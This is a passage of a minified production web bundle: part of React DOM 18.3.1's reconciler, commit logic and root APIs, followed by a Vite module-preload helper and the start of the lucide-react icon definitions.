            break
        } catch (s) {
            qd(e, s)
        }
    while (!0);
    if (bo(),
    q = n,
    Fr.current = r,
    oe !== null)
        throw Error(C(261));
    return me = null,
    pe = 0,
    ue
}
function Lp() {
    for (; oe !== null; )
        Jd(oe)
}
function Op() {
    for (; oe !== null && !mh(); )
        Jd(oe)
}
function Jd(e) {
    var t = Xd(e.alternate, e, De);
    e.memoizedProps = e.pendingProps,
    t === null ? Qd(e) : oe = t,
    Ro.current = null
}
function Qd(e) {
    var t = e;
    do {
        var n = t.alternate;
        if (e = t.return,
        t.flags & 32768) {
            if (n = Dp(n, t),
            n !== null) {
                n.flags &= 32767,
                oe = n;
                return
            }
            if (e !== null)
                e.flags |= 32768,
                e.subtreeFlags = 0,
                e.deletions = null;
            else {
                ue = 6,
                oe = null;
                return
            }
        } else if (n = Ip(n, t, De),
        n !== null) {
            oe = n;
            return
        }
        if (t = t.sibling,
        t !== null) {
            oe = t;
            return
        }
        oe = t = e
    } while (t !== null);
    ue === 0 && (ue = 5)
}
function Gt(e, t, n) {
    var r = Y
      , s = He.transition;
    try {
        He.transition = null,
        Y = 1,
        Fp(e, t, n, r)
    } finally {
        He.transition = s,
        Y = r
    }
    return null
}
function Fp(e, t, n, r) {
    do
        In();
    while ($t !== null);
    if (q & 6)
        throw Error(C(327));
    n = e.finishedWork;
    var s = e.finishedLanes;
    if (n === null)
        return null;
    if (e.finishedWork = null,
    e.finishedLanes = 0,
    n === e.current)
        throw Error(C(177));
    e.callbackNode = null,
    e.callbackPriority = 0;
    var i = n.lanes | n.childLanes;
    if (bh(e, i),
    e === me && (oe = me = null,
    pe = 0),
    !(n.subtreeFlags & 2064) && !(n.flags & 2064) || rr || (rr = !0,
    em(Br, function() {
        return In(),
        null
    })),
    i = (n.flags & 15990) !== 0,
    n.subtreeFlags & 15990 || i) {
        i = He.transition,
        He.transition = null;
        var o = Y;
        Y = 1;
        var l = q;
        q |= 4,
        Ro.current = null,
        Mp(e, n),
        Vd(n, e),
        lp(vi),
        Cr = !!yi,
        vi = yi = null,
        e.current = n,
        Up(n),
        hh(),
        q = l,
        Y = o,
        He.transition = i
    } else
        e.current = n;
    if (rr && (rr = !1,
    $t = e,
    _r = s),
    i = e.pendingLanes,
    i === 0 && (Mt = null),
    xh(n.stateNode),
    Ee(e, ie()),
    t !== null)
        for (r = e.onRecoverableError,
        n = 0; n < t.length; n++)
            s = t[n],
            r(s.value, {
                componentStack: s.stack,
                digest: s.digest
            });
    if (Kr)
        throw Kr = !1,
        e = Wi,
        Wi = null,
        e;
    return _r & 1 && e.tag !== 0 && In(),
    i = e.pendingLanes,
    i & 1 ? e === Li ? fa++ : (fa = 0,
    Li = e) : fa = 0,
    _t(),
    null
}
function In() {
    if ($t !== null) {
        var e = Eu(_r)
          , t = He.transition
          , n = Y;
        try {
            if (He.transition = null,
            Y = 16 > e ? 16 : e,
            $t === null)
                var r = !1;
            else {
                if (e = $t,
                $t = null,
                _r = 0,
                q & 6)
                    throw Error(C(331));
                var s = q;
                for (q |= 4,
                R = e.current; R !== null; ) {
                    var i = R
                      , o = i.child;
                    if (R.flags & 16) {
                        var l = i.deletions;
                        if (l !== null) {
                            for (var u = 0; u < l.length; u++) {
                                var c = l[u];
                                for (R = c; R !== null; ) {
                                    var m = R;
                                    switch (m.tag) {
                                    case 0:
                                    case 11:
                                    case 15:
                                        ha(8, m, i)
                                    }
                                    var h = m.child;
                                    if (h !== null)
                                        h.return = m,
                                        R = h;
                                    else
                                        for (; R !== null; ) {
                                            m = R;
                                            var x = m.sibling
                                              , y = m.return;
                                            if (Fd(m),
                                            m === c) {
                                                R = null;
                                                break
                                            }
                                            if (x !== null) {
                                                x.return = y,
                                                R = x;
                                                break
                                            }
                                            R = y
                                        }
                                }
                            }
                            var v = i.alternate;
                            if (v !== null) {
                                var k = v.child;
                                if (k !== null) {
                                    v.child = null;
                                    do {
                                        var p = k.sibling;
                                        k.sibling = null,
                                        k = p
                                    } while (k !== null)
                                }
                            }
                            R = i
                        }
                    }
                    if (i.subtreeFlags & 2064 && o !== null)
                        o.return = i,
                        R = o;
                    else
                        e: for (; R !== null; ) {
                            if (i = R,
                            i.flags & 2048)
                                switch (i.tag) {
                                case 0:
                                case 11:
                                case 15:
                                    ha(9, i, i.return)
                                }
                            var f = i.sibling;
                            if (f !== null) {
                                f.return = i.return,
                                R = f;
                                break e
                            }
                            R = i.return
                        }
                }
                var d = e.current;
                for (R = d; R !== null; ) {
                    o = R;
                    var g = o.child;
                    if (o.subtreeFlags & 2064 && g !== null)
                        g.return = o,
                        R = g;
                    else
                        e: for (o = d; R !== null; ) {
                            if (l = R,
                            l.flags & 2048)
                                try {
                                    switch (l.tag) {
                                    case 0:
                                    case 11:
                                    case 15:
                                        os(9, l)
                                    }
                                } catch (w) {
                                    se(l, l.return, w)
                                }
                            if (l === o) {
                                R = null;
                                break e
                            }
                            var S = l.sibling;
                            if (S !== null) {
                                S.return = l.return,
                                R = S;
                                break e
                            }
                            R = l.return
                        }
                }
                if (q = s,
                _t(),
                ct && typeof ct.onPostCommitFiberRoot == "function")
                    try {
                        ct.onPostCommitFiberRoot(Xr, e)
                    } catch {}
                r = !0
            }
            return r
        } finally {
            Y = n,
            He.transition = t
        }
    }
    return !1
}
function dc(e, t, n) {
    t = Ln(n, t),
    t = Ed(e, t, 1),
    e = Rt(e, t, 1),
    t = ke(),
    e !== null && (Wa(e, 1, t),
    Ee(e, t))
}
function se(e, t, n) {
    if (e.tag === 3)
        dc(e, e, n);
    else
        for (; t !== null; ) {
            if (t.tag === 3) {
                dc(t, e, n);
                break
            } else if (t.tag === 1) {
                var r = t.stateNode;
                if (typeof t.type.getDerivedStateFromError == "function" || typeof r.componentDidCatch == "function" && (Mt === null || !Mt.has(r))) {
                    e = Ln(n, e),
                    e = Ad(t, e, 1),
                    t = Rt(t, e, 1),
                    e = ke(),
                    t !== null && (Wa(t, 1, e),
                    Ee(t, e));
                    break
                }
            }
            t = t.return
        }
}
function Kp(e, t, n) {
    var r = e.pingCache;
    r !== null && r.delete(t),
    t = ke(),
    e.pingedLanes |= e.suspendedLanes & n,
    me === e && (pe & n) === n && (ue === 4 || ue === 3 && (pe & 130023424) === pe && 500 > ie() - Uo ? Zt(e, 0) : Mo |= n),
    Ee(e, t)
}
function Zd(e, t) {
    t === 0 && (e.mode & 1 ? (t = qa,
    qa <<= 1,
    !(qa & 130023424) && (qa = 4194304)) : t = 1);
    var n = ke();
    e = St(e, t),
    e !== null && (Wa(e, t, n),
    Ee(e, n))
}
function _p(e) {
    var t = e.memoizedState
      , n = 0;
    t !== null && (n = t.retryLane),
    Zd(e, n)
}
function Vp(e, t) {
    var n = 0;
    switch (e.tag) {
    case 13:
        var r = e.stateNode
          , s = e.memoizedState;
        s !== null && (n = s.retryLane);
        break;
    case 19:
        r = e.stateNode;
        break;
    default:
        throw Error(C(314))
    }
    r !== null && r.delete(t),
    Zd(e, n)
}
var Xd;
Xd = function(e, t, n) {
    if (e !== null)
        if (e.memoizedProps !== t.pendingProps || Pe.current)
            Ce = !0;
        else {
            if (!(e.lanes & n) && !(t.flags & 128))
                return Ce = !1,
                Ap(e, t, n);
            Ce = !!(e.flags & 131072)
        }
    else
        Ce = !1,
        te && t.flags & 1048576 && ad(t, Rr, t.index);
    switch (t.lanes = 0,
    t.tag) {
    case 2:
        var r = t.type;
        gr(e, t),
        e = t.pendingProps;
        var s = Mn(t, we.current);
        An(t, n),
        s = $o(null, t, r, e, s, n);
        var i = Eo();
        return t.flags |= 1,
        typeof s == "object" && s !== null && typeof s.render == "function" && s.$$typeof === void 0 ? (t.tag = 1,
        t.memoizedState = null,
        t.updateQueue = null,
        $e(r) ? (i = !0,
        Ir(t)) : i = !1,
        t.memoizedState = s.state !== null && s.state !== void 0 ? s.state : null,
        jo(t),
        s.updater = is,
        t.stateNode = s,
        s._reactInternals = t,
        Ci(t, r, e, n),
        t = Ei(null, t, r, !0, i, n)) : (t.tag = 0,
        te && i && yo(t),
        Ne(null, t, s, n),
        t = t.child),
        t;
    case 16:
        r = t.elementType;
        e: {
            switch (gr(e, t),
            e = t.pendingProps,
            s = r._init,
            r = s(r._payload),
            t.type = r,
            s = t.tag = Gp(r),
            e = Je(r, e),
            s) {
            case 0:
                t = $i(null, t, r, e, n);
                break e;
            case 1:
                t = tc(null, t, r, e, n);
                break e;
            case 11:
                t = Xl(null, t, r, e, n);
                break e;
            case 14:
                t = ec(null, t, r, Je(r.type, e), n);
                break e
            }
            throw Error(C(306, r, ""))
        }
        return t;
    case 0:
        return r = t.type,
        s = t.pendingProps,
        s = t.elementType === r ? s : Je(r, s),
        $i(e, t, r, s, n);
    case 1:
        return r = t.type,
        s = t.pendingProps,
        s = t.elementType === r ? s : Je(r, s),
        tc(e, t, r, s, n);
    case 3:
        e: {
            if (Md(t),
            e === null)
                throw Error(C(387));
            r = t.pendingProps,
            i = t.memoizedState,
            s = i.element,
            cd(e, t),
            zr(t, r, null, n);
            var o = t.memoizedState;
            if (r = o.element,
            i.isDehydrated)
                if (i = {
                    element: r,
                    isDehydrated: !1,
                    cache: o.cache,
                    pendingSuspenseBoundaries: o.pendingSuspenseBoundaries,
                    transitions: o.transitions
                },
                t.updateQueue.baseState = i,
                t.memoizedState = i,
                t.flags & 256) {
                    s = Ln(Error(C(423)), t),
                    t = nc(e, t, r, n, s);
                    break e
                } else if (r !== s) {
                    s = Ln(Error(C(424)), t),
                    t = nc(e, t, r, n, s);
                    break e
                } else
                    for (Re = Dt(t.stateNode.containerInfo.firstChild),
                    Ue = t,
                    te = !0,
                    Ze = null,
                    n = od(t, null, r, n),
                    t.child = n; n; )
                        n.flags = n.flags & -3 | 4096,
                        n = n.sibling;
            else {
                if (Un(),
                r === s) {
                    t = wt(e, t, n);
                    break e
                }
                Ne(e, t, r, n)
            }
            t = t.child
        }
        return t;
    case 5:
        return ud(t),
        e === null && ji(t),
        r = t.type,
        s = t.pendingProps,
        i = e !== null ? e.memoizedProps : null,
        o = s.children,
        Si(r, s) ? o = null : i !== null && Si(r, i) && (t.flags |= 32),
        Rd(e, t),
        Ne(e, t, o, n),
        t.child;
    case 6:
        return e === null && ji(t),
        null;
    case 13:
        return Ud(e, t, n);
    case 4:
        return Bo(t, t.stateNode.containerInfo),
        r = t.pendingProps,
        e === null ? t.child = zn(t, null, r, n) : Ne(e, t, r, n),
        t.child;
    case 11:
        return r = t.type,
        s = t.pendingProps,
        s = t.elementType === r ? s : Je(r, s),
        Xl(e, t, r, s, n);
    case 7:
        return Ne(e, t, t.pendingProps, n),
        t.child;
    case 8:
        return Ne(e, t, t.pendingProps.children, n),
        t.child;
    case 12:
        return Ne(e, t, t.pendingProps.children, n),
        t.child;
    case 10:
        e: {
            if (r = t.type._context,
            s = t.pendingProps,
            i = t.memoizedProps,
            o = s.value,
            Z(Mr, r._currentValue),
            r._currentValue = o,
            i !== null)
                if (nt(i.value, o)) {
                    if (i.children === s.children && !Pe.current) {
                        t = wt(e, t, n);
                        break e
                    }
                } else
                    for (i = t.child,
                    i !== null && (i.return = t); i !== null; ) {
                        var l = i.dependencies;
                        if (l !== null) {
                            o = i.child;
                            for (var u = l.firstContext; u !== null; ) {
                                if (u.context === r) {
                                    if (i.tag === 1) {
                                        u = gt(-1, n & -n),
                                        u.tag = 2;
                                        var c = i.updateQueue;
                                        if (c !== null) {
                                            c = c.shared;
                                            var m = c.pending;
                                            m === null ? u.next = u : (u.next = m.next,
                                            m.next = u),
                                            c.pending = u
                                        }
                                    }
                                    i.lanes |= n,
                                    u = i.alternate,
                                    u !== null && (u.lanes |= n),
                                    Bi(i.return, n, t),
                                    l.lanes |= n;
                                    break
                                }
                                u = u.next
                            }
                        } else if (i.tag === 10)
                            o = i.type === t.type ? null : i.child;
                        else if (i.tag === 18) {
                            if (o = i.return,
                            o === null)
                                throw Error(C(341));
                            o.lanes |= n,
                            l = o.alternate,
                            l !== null && (l.lanes |= n),
                            Bi(o, n, t),
                            o = i.sibling
                        } else
                            o = i.child;
                        if (o !== null)
                            o.return = i;
                        else
                            for (o = i; o !== null; ) {
                                if (o === t) {
                                    o = null;
                                    break
                                }
                                if (i = o.sibling,
                                i !== null) {
                                    i.return = o.return,
                                    o = i;
                                    break
                                }
                                o = o.return
                            }
                        i = o
                    }
            Ne(e, t, s.children, n),
            t = t.child
        }
        return t;
    case 9:
        return s = t.type,
        r = t.pendingProps.children,
        An(t, n),
        s = Ge(s),
        r = r(s),
        t.flags |= 1,
        Ne(e, t, r, n),
        t.child;
    case 14:
        return r = t.type,
        s = Je(r, t.pendingProps),
        s = Je(r.type, s),
        ec(e, t, r, s, n);
    case 15:
        return Id(e, t, t.type, t.pendingProps, n);
    case 17:
        return r = t.type,
        s = t.pendingProps,
        s = t.elementType === r ? s : Je(r, s),
        gr(e, t),
        t.tag = 1,
        $e(r) ? (e = !0,
        Ir(t)) : e = !1,
        An(t, n),
        $d(t, r, s),
        Ci(t, r, s, n),
        Ei(null, t, r, !0, e, n);
    case 19:
        return zd(e, t, n);
    case 22:
        return Dd(e, t, n)
    }
    throw Error(C(156, t.tag))
}
;
function em(e, t) {
    return Tu(e, t)
}
function Hp(e, t, n, r) {
    this.tag = e,
    this.key = n,
    this.sibling = this.child = this.return = this.stateNode = this.type = this.elementType = null,
    this.index = 0,
    this.ref = null,
    this.pendingProps = t,
    this.dependencies = this.memoizedState = this.updateQueue = this.memoizedProps = null,
    this.mode = r,
    this.subtreeFlags = this.flags = 0,
    this.deletions = null,
    this.childLanes = this.lanes = 0,
    this.alternate = null
}
function Ve(e, t, n, r) {
    return new Hp(e,t,n,r)
}
function Oo(e) {
    return e = e.prototype,
    !(!e || !e.isReactComponent)
}
function Gp(e) {
    if (typeof e == "function")
        return Oo(e) ? 1 : 0;
    if (e != null) {
        if (e = e.$$typeof,
        e === so)
            return 11;
        if (e === io)
            return 14
    }
    return 2
}
function zt(e, t) {
    var n = e.alternate;
    return n === null ? (n = Ve(e.tag, t, e.key, e.mode),
    n.elementType = e.elementType,
    n.type = e.type,
    n.stateNode = e.stateNode,
    n.alternate = e,
    e.alternate = n) : (n.pendingProps = t,
    n.type = e.type,
    n.flags = 0,
    n.subtreeFlags = 0,
    n.deletions = null),
    n.flags = e.flags & 14680064,
    n.childLanes = e.childLanes,
    n.lanes = e.lanes,
    n.child = e.child,
    n.memoizedProps = e.memoizedProps,
    n.memoizedState = e.memoizedState,
    n.updateQueue = e.updateQueue,
    t = e.dependencies,
    n.dependencies = t === null ? null : {
        lanes: t.lanes,
        firstContext: t.firstContext
    },
    n.sibling = e.sibling,
    n.index = e.index,
    n.ref = e.ref,
    n
}
function Sr(e, t, n, r, s, i) {
    var o = 2;
    if (r = e,
    typeof e == "function")
        Oo(e) && (o = 1);
    else if (typeof e == "string")
        o = 5;
    else
        e: switch (e) {
        case xn:
            return Xt(n.children, s, i, t);
        case ro:
            o = 8,
            s |= 8;
            break;
        case Zs:
            return e = Ve(12, n, t, s | 2),
            e.elementType = Zs,
            e.lanes = i,
            e;
        case Xs:
            return e = Ve(13, n, t, s),
            e.elementType = Xs,
            e.lanes = i,
            e;
        case ei:
            return e = Ve(19, n, t, s),
            e.elementType = ei,
            e.lanes = i,
            e;
        case uu:
            return cs(n, s, i, t);
        default:
            if (typeof e == "object" && e !== null)
                switch (e.$$typeof) {
                case lu:
                    o = 10;
                    break e;
                case cu:
                    o = 9;
                    break e;
                case so:
                    o = 11;
                    break e;
                case io:
                    o = 14;
                    break e;
                case jt:
                    o = 16,
                    r = null;
                    break e
                }
            throw Error(C(130, e == null ? e : typeof e, ""))
        }
    return t = Ve(o, n, t, s),
    t.elementType = e,
    t.type = r,
    t.lanes = i,
    t
}
function Xt(e, t, n, r) {
    return e = Ve(7, e, r, t),
    e.lanes = n,
    e
}
function cs(e, t, n, r) {
    return e = Ve(22, e, r, t),
    e.elementType = uu,
    e.lanes = n,
    e.stateNode = {
        isHidden: !1
    },
    e
}
function _s(e, t, n) {
    return e = Ve(6, e, null, t),
    e.lanes = n,
    e
}
function Vs(e, t, n) {
    return t = Ve(4, e.children !== null ? e.children : [], e.key, t),
    t.lanes = n,
    t.stateNode = {
        containerInfo: e.containerInfo,
        pendingChildren: null,
        implementation: e.implementation
    },
    t
}
function qp(e, t, n, r, s) {
    this.tag = t,
    this.containerInfo = e,
    this.finishedWork = this.pingCache = this.current = this.pendingChildren = null,
    this.timeoutHandle = -1,
    this.callbackNode = this.pendingContext = this.context = null,
    this.callbackPriority = 0,
    this.eventTimes = js(0),
    this.expirationTimes = js(-1),
    this.entangledLanes = this.finishedLanes = this.mutableReadLanes = this.expiredLanes = this.pingedLanes = this.suspendedLanes = this.pendingLanes = 0,
    this.entanglements = js(0),
    this.identifierPrefix = r,
    this.onRecoverableError = s,
    this.mutableSourceEagerHydrationData = null
}
function Fo(e, t, n, r, s, i, o, l, u) {
    return e = new qp(e,t,n,l,u),
    t === 1 ? (t = 1,
    i === !0 && (t |= 8)) : t = 0,
    i = Ve(3, null, null, t),
    e.current = i,
    i.stateNode = e,
    i.memoizedState = {
        element: r,
        isDehydrated: n,
        cache: null,
        transitions: null,
        pendingSuspenseBoundaries: null
    },
    jo(i),
    e
}
function Yp(e, t, n) {
    var r = 3 < arguments.length && arguments[3] !== void 0 ? arguments[3] : null;
    return {
        $$typeof: fn,
        key: r == null ? null : "" + r,
        children: e,
        containerInfo: t,
        implementation: n
    }
}
function tm(e) {
    if (!e)
        return Lt;
    e = e._reactInternals;
    e: {
        if (ln(e) !== e || e.tag !== 1)
            throw Error(C(170));
        var t = e;
        do {
            switch (t.tag) {
            case 3:
                t = t.stateNode.context;
                break e;
            case 1:
                if ($e(t.type)) {
                    t = t.stateNode.__reactInternalMemoizedMergedChildContext;
                    break e
                }
            }
            t = t.return
        } while (t !== null);
        throw Error(C(171))
    }
    if (e.tag === 1) {
        var n = e.type;
        if ($e(n))
            return td(e, n, t)
    }
    return t
}
function nm(e, t, n, r, s, i, o, l, u) {
    return e = Fo(n, r, !0, e, s, i, o, l, u),
    e.context = tm(null),
    n = e.current,
    r = ke(),
    s = Ut(n),
    i = gt(r, s),
    i.callback = t ?? null,
    Rt(n, i, s),
    e.current.lanes = s,
    Wa(e, s, r),
    Ee(e, r),
    e
}
function us(e, t, n, r) {
    var s = t.current
      , i = ke()
      , o = Ut(s);
    return n = tm(n),
    t.context === null ? t.context = n : t.pendingContext = n,
    t = gt(i, o),
    t.payload = {
        element: e
    },
    r = r === void 0 ? null : r,
    r !== null && (t.callback = r),
    e = Rt(s, t, o),
    e !== null && (et(e, s, o, i),
    pr(e, s, o)),
    o
}
function Hr(e) {
    if (e = e.current,
    !e.child)
        return null;
    switch (e.child.tag) {
    case 5:
        return e.child.stateNode;
    default:
        return e.child.stateNode
    }
}
function mc(e, t) {
    if (e = e.memoizedState,
    e !== null && e.dehydrated !== null) {
        var n = e.retryLane;
        e.retryLane = n !== 0 && n < t ? n : t
    }
}
function Ko(e, t) {
    mc(e, t),
    (e = e.alternate) && mc(e, t)
}
function Jp() {
    return null
}
var am = typeof reportError == "function" ? reportError : function(e) {
    console.error(e)
}
;
function _o(e) {
    this._internalRoot = e
}
ds.prototype.render = _o.prototype.render = function(e) {
    var t = this._internalRoot;
    if (t === null)
        throw Error(C(409));
    us(e, t, null, null)
}
;
ds.prototype.unmount = _o.prototype.unmount = function() {
    var e = this._internalRoot;
    if (e !== null) {
        this._internalRoot = null;
        var t = e.containerInfo;
        sn(function() {
            us(null, e, null, null)
        }),
        t[vt] = null
    }
}
;
function ds(e) {
    this._internalRoot = e
}
ds.prototype.unstable_scheduleHydration = function(e) {
    if (e) {
        var t = Du();
        e = {
            blockedOn: null,
            target: e,
            priority: t
        };
        for (var n = 0; n < Tt.length && t !== 0 && t < Tt[n].priority; n++)
            ;
        Tt.splice(n, 0, e),
        n === 0 && Mu(e)
    }
}
;
function Vo(e) {
    return !(!e || e.nodeType !== 1 && e.nodeType !== 9 && e.nodeType !== 11)
}
function ms(e) {
    return !(!e || e.nodeType !== 1 && e.nodeType !== 9 && e.nodeType !== 11 && (e.nodeType !== 8 || e.nodeValue !== " react-mount-point-unstable "))
}
function hc() {}
function Qp(e, t, n, r, s) {
    if (s) {
        if (typeof r == "function") {
            var i = r;
            r = function() {
                var c = Hr(o);
                i.call(c)
            }
        }
        var o = nm(t, r, e, 0, null, !1, !1, "", hc);
        return e._reactRootContainer = o,
        e[vt] = o.current,
        Ba(e.nodeType === 8 ? e.parentNode : e),
        sn(),
        o
    }
    for (; s = e.lastChild; )
        e.removeChild(s);
    if (typeof r == "function") {
        var l = r;
        r = function() {
            var c = Hr(u);
            l.call(c)
        }
    }
    var u = Fo(e, 0, !1, null, null, !1, !1, "", hc);
    return e._reactRootContainer = u,
    e[vt] = u.current,
    Ba(e.nodeType === 8 ? e.parentNode : e),
    sn(function() {
        us(t, u, n, r)
    }),
    u
}
function hs(e, t, n, r, s) {
    var i = n._reactRootContainer;
    if (i) {
        var o = i;
        if (typeof s == "function") {
            var l = s;
            s = function() {
                var u = Hr(o);
                l.call(u)
            }
        }
        us(t, o, e, s)
    } else
        o = Qp(n, t, e, s, r);
    return Hr(o)
}
Au = function(e) {
    switch (e.tag) {
    case 3:
        var t = e.stateNode;
        if (t.current.memoizedState.isDehydrated) {
            var n = sa(t.pendingLanes);
            n !== 0 && (co(t, n | 1),
            Ee(t, ie()),
            !(q & 6) && (On = ie() + 500,
            _t()))
        }
        break;
    case 13:
        sn(function() {
            var r = St(e, 1);
            if (r !== null) {
                var s = ke();
                et(r, e, 1, s)
            }
        }),
        Ko(e, 1)
    }
}
;
uo = function(e) {
    if (e.tag === 13) {
        var t = St(e, 134217728);
        if (t !== null) {
            var n = ke();
            et(t, e, 134217728, n)
        }
        Ko(e, 134217728)
    }
}
;
Iu = function(e) {
    if (e.tag === 13) {
        var t = Ut(e)
          , n = St(e, t);
        if (n !== null) {
            var r = ke();
            et(n, e, t, r)
        }
        Ko(e, t)
    }
}
;
Du = function() {
    return Y
}
;
Ru = function(e, t) {
    var n = Y;
    try {
        return Y = e,
        t()
    } finally {
        Y = n
    }
}
;
ui = function(e, t, n) {
    switch (t) {
    case "input":
        if (ai(e, n),
        t = n.name,
        n.type === "radio" && t != null) {
            for (n = e; n.parentNode; )
                n = n.parentNode;
            for (n = n.querySelectorAll("input[name=" + JSON.stringify("" + t) + '][type="radio"]'),
            t = 0; t < n.length; t++) {
                var r = n[t];
                if (r !== e && r.form === e.form) {
                    var s = as(r);
                    if (!s)
                        throw Error(C(90));
                    mu(r),
                    ai(r, s)
                }
            }
        }
        break;
    case "textarea":
        pu(e, n);
        break;
    case "select":
        t = n.value,
        t != null && Cn(e, !!n.multiple, t, !1)
    }
}
;
wu = zo;
bu = sn;
var Zp = {
    usingClientEntryPoint: !1,
    Events: [Oa, Sn, as, vu, Su, zo]
}
  , ea = {
    findFiberByHostInstance: qt,
    bundleType: 0,
    version: "18.3.1",
    rendererPackageName: "react-dom"
}
  , Xp = {
    bundleType: ea.bundleType,
    version: ea.version,
    rendererPackageName: ea.rendererPackageName,
    rendererConfig: ea.rendererConfig,
    overrideHookState: null,
    overrideHookStateDeletePath: null,
    overrideHookStateRenamePath: null,
    overrideProps: null,
    overridePropsDeletePath: null,
    overridePropsRenamePath: null,
    setErrorHandler: null,
    setSuspenseHandler: null,
    scheduleUpdate: null,
    currentDispatcherRef: bt.ReactCurrentDispatcher,
    findHostInstanceByFiber: function(e) {
        return e = ju(e),
        e === null ? null : e.stateNode
    },
    findFiberByHostInstance: ea.findFiberByHostInstance || Jp,
    findHostInstancesForRefresh: null,
    scheduleRefresh: null,
    scheduleRoot: null,
    setRefreshHandler: null,
    getCurrentFiber: null,
    reconcilerVersion: "18.3.1-next-f1338f8080-20240426"
};
if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ < "u") {
    var sr = __REACT_DEVTOOLS_GLOBAL_HOOK__;
    if (!sr.isDisabled && sr.supportsFiber)
        try {
            Xr = sr.inject(Xp),
            ct = sr
        } catch {}
}
We.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = Zp;
We.createPortal = function(e, t) {
    var n = 2 < arguments.length && arguments[2] !== void 0 ? arguments[2] : null;
    if (!Vo(t))
        throw Error(C(200));
    return Yp(e, t, null, n)
}
;
We.createRoot = function(e, t) {
    if (!Vo(e))
        throw Error(C(299));
    var n = !1
      , r = ""
      , s = am;
    return t != null && (t.unstable_strictMode === !0 && (n = !0),
    t.identifierPrefix !== void 0 && (r = t.identifierPrefix),
    t.onRecoverableError !== void 0 && (s = t.onRecoverableError)),
    t = Fo(e, 1, !1, null, null, n, !1, r, s),
    e[vt] = t.current,
    Ba(e.nodeType === 8 ? e.parentNode : e),
    new _o(t)
}
;
We.findDOMNode = function(e) {
    if (e == null)
        return null;
    if (e.nodeType === 1)
        return e;
    var t = e._reactInternals;
    if (t === void 0)
        throw typeof e.render == "function" ? Error(C(188)) : (e = Object.keys(e).join(","),
        Error(C(268, e)));
    return e = ju(t),
    e = e === null ? null : e.stateNode,
    e
}
;
We.flushSync = function(e) {
    return sn(e)
}
;
We.hydrate = function(e, t, n) {
    if (!ms(t))
        throw Error(C(200));
    return hs(null, e, t, !0, n)
}
;
We.hydrateRoot = function(e, t, n) {
    if (!Vo(e))
        throw Error(C(405));
    var r = n != null && n.hydratedSources || null
      , s = !1
      , i = ""
      , o = am;
    if (n != null && (n.unstable_strictMode === !0 && (s = !0),
    n.identifierPrefix !== void 0 && (i = n.identifierPrefix),
    n.onRecoverableError !== void 0 && (o = n.onRecoverableError)),
    t = nm(t, null, e, 1, n ?? null, s, !1, i, o),
    e[vt] = t.current,
    Ba(e),
    r)
        for (e = 0; e < r.length; e++)
            n = r[e],
            s = n._getVersion,
            s = s(n._source),
            t.mutableSourceEagerHydrationData == null ? t.mutableSourceEagerHydrationData = [n, s] : t.mutableSourceEagerHydrationData.push(n, s);
    return new ds(t)
}
;
We.render = function(e, t, n) {
    if (!ms(t))
        throw Error(C(200));
    return hs(null, e, t, !1, n)
}
;
We.unmountComponentAtNode = function(e) {
    if (!ms(e))
        throw Error(C(40));
    return e._reactRootContainer ? (sn(function() {
        hs(null, null, e, !1, function() {
            e._reactRootContainer = null,
            e[vt] = null
        })
    }),
    !0) : !1
}
;
We.unstable_batchedUpdates = zo;
We.unstable_renderSubtreeIntoContainer = function(e, t, n, r) {
    if (!ms(n))
        throw Error(C(200));
    if (e == null || e._reactInternals === void 0)
        throw Error(C(38));
    return hs(e, t, n, !1, r)
}
;
We.version = "18.3.1-next-f1338f8080-20240426";
function rm() {
    if (!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" || typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function"))
        try {
            __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(rm)
        } catch (e) {
            console.error(e)
        }
}
rm(),
ru.exports = We;
var ef = ru.exports, sm, pc = ef;
sm = pc.createRoot,
pc.hydrateRoot;
const tf = "modulepreload"
  , nf = function(e) {
    return "/" + e
}
  , fc = {}
  , xc = function(t, n, r) {
    let s = Promise.resolve();
    if (n && n.length > 0) {
        document.getElementsByTagName("link");
        const o = document.querySelector("meta[property=csp-nonce]")
          , l = (o == null ? void 0 : o.nonce) || (o == null ? void 0 : o.getAttribute("nonce"));
        s = Promise.allSettled(n.map(u => {
            if (u = nf(u),
            u in fc)
                return;
            fc[u] = !0;
            const c = u.endsWith(".css")
              , m = c ? '[rel="stylesheet"]' : "";
            if (document.querySelector(`link[href="${u}"]${m}`))
                return;
            const h = document.createElement("link");
            if (h.rel = c ? "stylesheet" : tf,
            c || (h.as = "script"),
            h.crossOrigin = "",
            h.href = u,
            l && h.setAttribute("nonce", l),
            document.head.appendChild(h),
            c)
                return new Promise( (x, y) => {
                    h.addEventListener("load", x),
                    h.addEventListener("error", () => y(new Error(`Unable to preload CSS for ${u}`)))
                }
                )
        }
        ))
    }
    function i(o) {
        const l = new Event("vite:preloadError",{
            cancelable: !0
        });
        if (l.payload = o,
        window.dispatchEvent(l),
        !l.defaultPrevented)
            throw o
    }
    return s.then(o => {
        for (const l of o || [])
            l.status === "rejected" && i(l.reason);
        return t().catch(i)
    }
    )
};
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
var af = {
    xmlns: "http://www.w3.org/2000/svg",
    width: 24,
    height: 24,
    viewBox: "0 0 24 24",
    fill: "none",
    stroke: "currentColor",
    strokeWidth: 2,
    strokeLinecap: "round",
    strokeLinejoin: "round"
};
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const rf = e => e.replace(/([a-z0-9])([A-Z])/g, "$1-$2").toLowerCase().trim()
  , _ = (e, t) => {
    const n = E.forwardRef( ({color: r="currentColor", size: s=24, strokeWidth: i=2, absoluteStrokeWidth: o, className: l="", children: u, ...c}, m) => E.createElement("svg", {
        ref: m,
        ...af,
        width: s,
        height: s,
        stroke: r,
        strokeWidth: o ? Number(i) * 24 / Number(s) : i,
        className: ["lucide", `lucide-${rf(e)}`, l].join(" "),
        ...c
    }, [...t.map( ([h,x]) => E.createElement(h, x)), ...Array.isArray(u) ? u : [u]]));
    return n.displayName = `${e}`,
    n
}
;
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const gc = _("Activity", [["path", {
    d: "M22 12h-4l-3 9L9 3l-3 9H2",
    key: "d5dnw9"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
